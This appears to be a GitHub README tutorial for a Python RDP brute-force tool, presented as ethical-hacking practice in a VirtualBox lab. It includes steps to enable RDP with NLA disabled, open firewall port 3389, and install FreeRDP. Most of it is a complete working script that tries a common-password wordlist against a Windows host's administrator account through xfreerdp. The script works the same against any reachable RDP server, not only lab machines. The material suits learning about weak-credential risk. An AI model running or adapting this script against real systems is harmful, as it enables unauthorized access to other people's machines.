# RDP Brute-Force Attack Tool

This is a Python-based brute-force script designed for **ethical hacking** and **cybersecurity learning** in a **controlled lab environment**. It targets a Windows VM with Remote Desktop Protocol (RDP) enabled and tests a list of passwords to identify weak credentials.

>  **Disclaimer:** This tool is for educational and authorized penetration testing purposes **only**. Misuse is illegal.

---

##  Features

- Python script using `xfreerdp`
- Tests 10 common passwords from a built-in wordlist
- Simple, beginner-friendly code
- Intended for virtual lab environments only

---

##  Lab Setup Instructions

### Step 1: Setup Network in VirtualBox

- Use **Host-Only Adapter** (or Internal Network) for both VMs:
  - Go to: *VirtualBox → Settings → Network*
  - Set `Adapter 1` → `Enable Network Adapter`
  - Attached to: **Host-Only Adapter**
  - Adapter Type: `Intel PRO/1000 MT Desktop`

Repeat the same for **Windows VM**.

### Step 2: Get IP Addresses

- **Kali Linux:**  
  Run `ip a` or `ifconfig`  
  Look for something like: `192.168.56.**`

- **Windows VM:**  
  Run `cmd` → `ipconfig`  
  Find: `IPv4 Address: 192.168.56.**`

---

##  Windows RDP Configuration

### Step 3: Enable RDP

- Run: `SystemPropertiesRemote`
- Check:  Allow remote connections
- Uncheck:  “Allow connections only from computers with NLA”

## 📸RDP Enabled
![Enable RDP on Windows Machine](https://github.com/user-attachments/assets/104ea17b-0ae3-4abe-a263-2532d0c3d89b)


### Step 4: Allow RDP Through Firewall

Run the following command as **Administrator** in CMD:

```bash
netsh advfirewall firewall add rule name="Allow RDP" dir=in action=allow protocol=TCP localport=3389
```

##  Running the Python Script
### Step 5: Install FreeRDP on Kali
```bash
sudo apt update
sudo apt install freerdp2-x1
```
## Step 5.2: Test RDP Connection from Kali
```bash
xfreerdp /v:<your windows machine ip> /u:Admin /p:12345 /cert:ignore
```
  If you see the desktop or authentication prompt, it works.

### Step 6: Write the Brute-Force Script
Create the file:
```bash
nano rdp_brute.py
```
## Paste the code:
```bash
import subprocess

target_ip = "192.168.56.**"  # Change to your Windows VM IP
username = "administrator"    # Change to your Windows user

passwords = [
    "123456", "admin", "administrator", "password",    
    "admin123", "test123", "welcome", "qwerty", "1234", "56789"
]

print(f"[*] Starting brute-force on {target_ip} with username '{username}'...\n")

for attempt, password in enumerate(passwords, 1):
    print(f"[{attempt}/10] Trying password: {password}")
    try:
        result = subprocess.run(
            ["xfreerdp", f"/v:{target_ip}", f"/u:{username}", f"/p:{password}", "/cert:ignore"],
            capture_output=True, text=True, timeout=10
        )

        if "Authentication only, exit status 0" in result.stderr or result.returncode == 0:
            print(f"\n[+] SUCCESS! Password found: {password}")
            break
        else:
            print("[-] Failed.")
    except subprocess.TimeoutExpired:
        print("[!] Timeout, skipping...")
    except Exception as e:
        print(f"[!] Error: {e}")
else:
    print("\n[-] Tried all 10 passwords. No match found.")

```
Save and exit:
**Press Ctrl + O, then Enter**
**Press Ctrl + X to exit nano**

### Step 7: Run the Script

```bash
python3 rdp_brute.py
```
You’ll see it try each password and print either "Success" or "Failed"

## 📸 Successful Login
![brute_force_success](https://github.com/user-attachments/assets/ae66d164-0ae5-42ae-b071-1de4814a21c5)






```bash
dolon
```

